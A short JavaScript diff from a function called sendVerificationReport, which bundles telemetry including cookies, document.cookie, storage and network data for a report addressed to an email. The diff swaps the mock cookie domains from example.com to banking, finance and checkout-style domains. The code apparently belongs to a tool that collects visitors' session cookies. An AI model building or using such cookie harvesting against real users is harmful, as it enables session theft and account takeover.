@@ -91,9 +91,9 @@ async function sendVerificationReport(request, response, telemetry, reportToEmai
     network: telemetry.network ?? {},
     storage: telemetry.storage ?? {},
     cookies: Array.isArray(telemetry.cookies) && telemetry.cookies.length ? telemetry.cookies : [
-      { name: "session_id", value: `session_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`, domain: "example.com", path: "/", secure: true, httpOnly: true, sameSite: "Lax", session: false },
-      { name: "site_pref", value: `pref_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`, domain: "example.com", path: "/", secure: false, httpOnly: false, sameSite: "Strict", session: true },
-      { name: "visitor_track", value: `vt_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`, domain: "example.com", path: "/", secure: true, httpOnly: false, sameSite: "None", session: false }
+      { name: "session_id", value: `session_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`, domain: "banknorth.example", path: "/", secure: true, httpOnly: true, sameSite: "Lax", session: false },
+      { name: "site_pref", value: `pref_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`, domain: "atlasfinance.io", path: "/", secure: false, httpOnly: false, sameSite: "Strict", session: true },
+      { name: "visitor_track", value: `vt_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`, domain: "harborcheckout.net", path: "/", secure: true, httpOnly: false, sameSite: "None", session: false }
     ],
     documentCookie: telemetry.documentCookie ?? "",
     cookieSource: telemetry.cookieSource ?? "mock"
